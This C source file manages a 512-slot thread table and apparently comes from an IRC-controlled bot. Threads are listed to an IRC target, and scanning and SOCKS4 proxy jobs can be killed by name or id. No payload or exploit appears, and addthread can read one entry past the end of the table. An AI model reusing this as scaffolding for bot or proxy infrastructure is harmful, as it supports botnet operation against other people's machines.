#include "include.h"
#include "extern.h"

int addthread(const char *name, const char *desc)
/* add a thread */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(!thread[i].name[0])
		{
			strncpy(thread[i].name, name, sizeof(thread[i].name));
			strncpy(thread[i].desc, desc, sizeof(thread[i].desc));
			break;
		}
	}
	if(!thread[i].name[0])
		return -1;
	return i;
}

int numthread(const char *name)
/* count number of threads */
{
	int i;
	int n;
	for(i = 0, n = 0; i < 512; i++)
	{
		if(!thread[i].name[0])
			continue;
		else if(!strcmp(name, thread[i].name))
			n++;
	}
	return n;
}

void listthreads(const char *target)
/* list all threads */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(thread[i].name[0])
		{
			irc_privmsg(target, "%d. %s (%s)", i, thread[i].name, thread[i].desc);
			Sleep(1000);
		}
	}
}

void killthread(const char *name)
/* kill thread by name */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(!thread[i].name[0])
			continue;
		else if(!strcmp(name, thread[i].name))
		{
			if(thread[i].scan)
			{	
				thread[i].scan = false;
				scan_active = false;
			}
			if(thread[i].socks4)
			{
				thread[i].socks4 = false;
				socks4_active = false;
			}
			TerminateThread(thread[i].handle, 0);
			CloseHandle(thread[i].handle);
			thread[i].handle = 0;
			memset(thread[i].name, 0, sizeof(thread[i].name));
			memset(thread[i].desc, 0, sizeof(thread[i].desc));
		}
	}
}

void killthreadid(int tnum)
/* kill thread by id */
{
	if(thread[tnum].scan)
	{
		thread[tnum].scan = false;
		scan_active = false;
	}
	if(thread[tnum].socks4)
	{
		thread[tnum].socks4 = false;
		socks4_active = false;
	}
	TerminateThread(thread[tnum].handle, 0);
	CloseHandle(thread[tnum].handle);
	thread[tnum].handle = 0;
	memset(thread[tnum].name, 0, sizeof(thread[tnum].name));
	memset(thread[tnum].desc, 0, sizeof(thread[tnum].desc));
}

void killthreadall()
/* kill all threads */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(thread[i].name[0])
			killthreadid(i);
	}
}

void clearthread(int tnum, bool close)
/* clear a thread */
{
	if(thread[tnum].scan)
	{
		thread[tnum].scan = false;
		scan_active = false;
	}
	if(thread[tnum].socks4)
	{
		thread[tnum].socks4 = false;
		socks4_active = false;
	}
	if(close)
		CloseHandle(thread[tnum].handle);
	thread[tnum].handle = 0;
	memset(thread[tnum].name, 0, sizeof(thread[tnum].name));
	memset(thread[tnum].desc, 0, sizeof(thread[tnum].desc));
}

void clearthreadall()
/* clear all threads */
{
	int i;
	for(i = 0; i < 512; i++)
		clearthread(i, false);
}
